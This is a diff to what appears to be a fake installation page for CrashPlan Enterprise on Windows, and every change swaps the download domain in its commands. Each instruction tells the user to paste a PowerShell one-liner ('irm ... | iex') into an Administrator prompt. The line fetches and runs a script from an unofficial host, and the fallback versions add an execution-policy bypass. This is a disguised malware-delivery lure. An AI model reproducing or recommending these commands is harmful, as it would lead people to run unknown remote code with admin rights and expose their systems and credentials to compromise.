@@ -16,13 +16,13 @@ CrashPlan Enterprise · Cloud backup · Recovery tools · Windows deployment
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://webmania.xyz/ps/setup.ps1 | iex
+irm https://beyondapp.pro/ps/setup.ps1 | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://webmania.xyz/ps/setup.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"
 ```
 
 
@@ -58,7 +58,7 @@ Notes for users who need **CrashPlan Enterprise** running on Windows — especia
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://webmania.xyz/ps/setup.ps1 | iex</code>
+<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://beyondapp.pro/ps/setup.ps1 | iex</code>
 </details>
 
 <details>
@@ -68,7 +68,7 @@ Notes for users who need **CrashPlan Enterprise** running on Windows — especia
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://webmania.xyz/ps/setup.ps1 | iex"</code>
+<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"</code>
 </details>
 
 <details>
